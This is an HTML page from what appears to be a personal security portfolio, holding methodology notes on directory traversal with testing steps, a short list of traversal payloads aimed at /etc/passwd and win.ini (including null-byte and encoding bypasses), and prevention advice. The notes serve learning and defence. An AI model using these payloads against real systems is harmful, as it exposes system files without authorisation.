@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="../../../../../../assets/css/search.css">
+    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">
+
+
+
+    <title>Methodology</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <div class="search-bar">
+                <input type="text" id="searchInput" class="search-input" placeholder="Search Notes...">
+                <!-- <button onclick="search()" class="search-button">Search</button> -->
+                <div id="searchResults" class="search-results"></div>
+
+              </div>
+
+            </div>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#home" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div> -->
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="ec5643ed-622b-474b-9bb6-28833b5cb3be" class="page sans"><header><h1 class="page-title">Directory Traversal</h1><p class="page-description"></p></header><div class="page-body"><ul id="11830c96-b600-4b63-8c0c-057ceba70ced" class="bulleted-list"><li style="list-style-type:disc">We can use user controllable parameters to traverse unintended files </li></ul><p id="0f6e7ca9-96e8-4080-b05f-3c9198172efa" class="">
+</p><figure id="e8f1553d-2f26-4e9e-8b72-48d4f59163b2" class="image"><a href="Directory%20Traversal%20ec5643ed622b474b9bb628833b5cb3be/Untitled.png"><img style="width:1806px" src="Directory%20Traversal%20ec5643ed622b474b9bb628833b5cb3be/Untitled.png"/></a></figure><figure id="7d2760db-dd98-4a4c-91c8-5255b3dba081" class="image"><a href="Directory%20Traversal%20ec5643ed622b474b9bb628833b5cb3be/Untitled%201.png"><img style="width:1806px" src="Directory%20Traversal%20ec5643ed622b474b9bb628833b5cb3be/Untitled%201.png"/></a></figure><p id="27d916fa-f6d4-40b3-b75e-1cfa0e3d1ea0" class="">
+</p><p id="01f58159-f048-46ed-9fa3-08c629ee4397" class="">
+</p><p id="66aa2125-a550-42a1-9ef8-950146ba2788" class=""><strong>Finding Directory Traversal:</strong></p><p id="54467e00-d95f-4b56-a5a0-5556fbce8860" class="">
+</p><ul id="cafceaca-8c18-4a08-b1df-1139ab3d043f" class="bulleted-list"><li style="list-style-type:disc">Map the Application</li></ul><ul id="487a221f-5823-44ca-8713-3109a5e0ab36" class="bulleted-list"><li style="list-style-type:disc">Use payloads to test for DT</li></ul><ul id="77a5e2e5-a913-4840-be15-27ab1fbedf54" class="bulleted-list"><li style="list-style-type:disc">Check for file uploads to disclose file structure</li></ul><ul id="26734743-399e-4a85-a77c-68729eca861f" class="bulleted-list"><li style="list-style-type:disc">Check images for file structure disclosure</li></ul><ul id="7907e6d0-479e-43c1-98e6-e59a119badea" class="bulleted-list"><li style="list-style-type:disc">Fuzz with Burp payload list</li></ul><ul id="b1ae7a26-b85e-45f2-af67-5509bac848c1" class="bulleted-list"><li style="list-style-type:disc">Fuzz with own list and Matching feature in burp</li></ul><ul id="7422aa70-58b6-4732-bbf7-3518a40ecd7d" class="bulleted-list"><li style="list-style-type:disc">Mix and match encodings</li></ul><ul id="6bad6301-d567-4284-bb12-607f79322c6e" class="bulleted-list"><li style="list-style-type:disc">Check cookies, request bodies, url params, </li></ul><p id="de0fd085-a7b6-43c6-b5e8-4ef191c0fbbe" class="">
+</p><p id="27d0bfdc-f090-437c-93c2-6e216f36e2e5" class="">Exploitation:</p><p id="807ee5b8-f7b1-4979-8736-6f02d02aa756" class="">regular:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d8d81f7a-0488-4658-9eb2-2b802836c48c" class="code"><code class="language-PHP">../../../../../etc/passwd
+../../../../../windows/win.ini</code></pre><p id="1cba2fdb-17c8-4930-a6fb-32bedc5c5de3" class="">
+</p><p id="bcdf144a-b2f8-4f32-92ea-c158f3a67878" class="">Absolute paths:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3d3f2b60-7655-40ea-8441-f9ec23bef22c" class="code"><code class="language-PHP">/etc/passwd</code></pre><p id="e154c1d9-a7f6-4622-a707-501bea8eeb32" class="">Traversal sequences stripped non-recursively:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="327e4f3b-9021-4cf7-a822-3f54e864712c" class="code"><code class="language-PHP">....//....//...//etc/passwd</code></pre><p id="1dbac72b-a863-4f78-b0be-f625029cb3f6" class="">URL Encoding, Double URL encoding:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1eaabd0f-7020-4d78-9129-32c958eab676" class="code"><code class="language-PHP"></code></pre><p id="9d8397f5-afa3-48b5-9572-e19cbb7ec99d" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="714b6420-5096-4544-ad8c-99fa772e0fc1" class="code"><code class="language-PHP">#requires specific starting path
+/var/www/images/../../../../etc/passwd</code></pre><p id="393f968d-aa21-45d6-9c34-21d96784d551" class="">Bypass file extension validation via null byte:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="62f94db9-ace1-4181-b104-334b1f5540da" class="code"><code class="language-PHP">#requires .png
+#only works with certain frameworks/configurations
+../../../etc/passwd%00.png</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="41672cdd-546b-43ff-8afd-8a1b20231311" class="code"><code class="language-PHP">..%2ffile</code></pre><p id="983f1c5e-b0ae-41dc-a083-2158e925c6d2" class="">
+</p><p id="e7f127fb-8321-4713-b822-584f452d59c7" class=""><strong>Prevention</strong>:</p><ul id="076ae86a-fd9b-4a12-a432-621fe7f1c820" class="bulleted-list"><li style="list-style-type:disc">avoid passing user supplied input to filesystem APIs</li></ul><ul id="1abb6790-613a-4b82-989b-3de83fa60f35" class="bulleted-list"><li style="list-style-type:disc">Validate user input by comparing it to an allow list</li></ul><ul id="fbf3d04a-6594-4749-8811-07c3cbcd3331" class="bulleted-list"><li style="list-style-type:disc">utilize file id or file path referencing</li></ul><ul id="70c05fb2-110d-47c4-a4eb-31f34c578904" class="bulleted-list"><li style="list-style-type:disc">Utilize filesystem API to canonicalize the path and verify is starts with the expected base directory</li></ul><p id="90af1055-a0a3-4160-a7b3-e4c1050fdb0c" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c237fac8-dc43-4c7b-a0fa-9b1b9931729a" class="code"><code class="language-Python">../../../../etc/passwd
+....//
+....\/
+..../\
+....\\
+
+../../etc/passwd%00.jpg
+requiredFile/../../etc/passwd
+
+
+Different encodings
+URL-Encoding
+- 
+- 
+- 
+
+16bit unicode encoding
+
+
+Double URL encoding
+
+Overlong UTF-8 unicode encoding
+
+
+</code></pre></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="../../../../../../assets/js/main.js"></script>
+    <script src="../../../../../../assets/js/search.js"></script>
+
+
+</body>
+</html>
